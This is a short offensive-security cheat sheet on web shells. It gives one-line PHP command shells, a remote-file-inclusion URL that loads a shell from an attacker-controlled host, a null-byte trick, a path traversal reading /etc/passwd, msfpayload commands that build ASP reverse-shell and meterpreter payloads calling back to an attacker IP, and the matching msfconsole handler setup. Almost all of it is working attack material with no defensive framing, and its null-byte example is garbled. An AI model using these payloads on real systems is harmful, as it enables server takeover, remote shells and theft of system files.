The following web shells are the most reliable in terms of simplicity & functionaliy -

1. Php-reverse shell by pentestmonkey
2. b374k by 

<?php system($_GET['cmd']) ?>
or
<?php system($_REQUEST['cmd']); ?>
Example usage via Remote File Include (RFI):
http://<target-ip>/index.php?cmd=<command to execute>&page=http://<attacker-ip>/cmd.php
Null Bytes (‰00 - html code ampersand, hash 137, 00) may also assist in some cases:
http://<target-ip>/index.php?cmd=<command to execute>&page=http://<attacker-ip>/cmd.php
‰
e.g.
http://<attacker-ip>/index.php?system=../../../../../etc/passwd.html
Encoding windows reverse command shell as asp
msfpayload windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-nc-port> R | msfencode -t asp -o <filename>.asp
Encoding meterpreter in asp
msfpayload windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-multi-handler-port> R | msfencode -t asp -o <filename>.asp
------
attacker msfconsole:
use multi/exploit/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT <attacker-multi-handler-port>
exploit
